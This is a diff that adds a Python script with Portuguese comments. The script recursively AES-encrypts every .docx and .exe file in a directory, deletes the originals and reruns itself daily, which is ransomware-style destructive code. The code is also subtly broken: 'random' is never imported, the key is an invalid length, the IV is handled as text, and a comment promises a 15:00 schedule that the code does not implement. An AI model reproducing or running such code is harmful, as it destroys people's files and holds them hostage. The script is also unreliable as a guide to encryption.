@@ -1,0 +1,57 @@
+from Crypto.Cipher import AES
+import os
+import sched
+import time
+
+# Define a chave de criptografia
+key = b'chave_secreta'
+
+# Define o diretório que contém os arquivos a serem criptografados
+directory = 'caminho_para_o_diretorio'
+
+# Define a função para criptografar os arquivos
+def encrypt_file(filename, key):
+    chunksize = 64*1024
+    outputFile = filename + '.encrypted'
+
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV = ''
+
+    for i in range(16):
+        IV += chr(random.randint(0, 0xFF))
+
+    encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+    with open(filename, 'rb') as infile:
+        with open(outputFile, 'wb') as outfile:
+            outfile.write(filesize.encode('utf-8'))
+            outfile.write(IV.encode('utf-8'))
+
+            while True:
+                chunk = infile.read(chunksize)
+
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' '*(16 - (len(chunk) % 16))
+
+                outfile.write(encryptor.encrypt(chunk))
+
+    os.remove(filename)
+
+# Define a função para criptografar todos os arquivos no diretório
+def encrypt_files(directory, key):
+    for subdir, dirs, files in os.walk(directory):
+        for file in files:
+            if file.endswith('.docx') or file.endswith('.exe'):
+                encrypt_file(os.path.join(subdir, file), key)
+
+# Define a função para agendar a criptografia
+def schedule_encryption(directory, key):
+    encrypt_files(directory, key)
+    scheduler = sched.scheduler(time.time, time.sleep)
+    scheduler.enter(86400, 1, schedule_encryption, (directory, key,))
+    scheduler.run()
+
+# Agenda a criptografia para acontecer todos os dias às 15 horas
+schedule_encryption(directory, key)
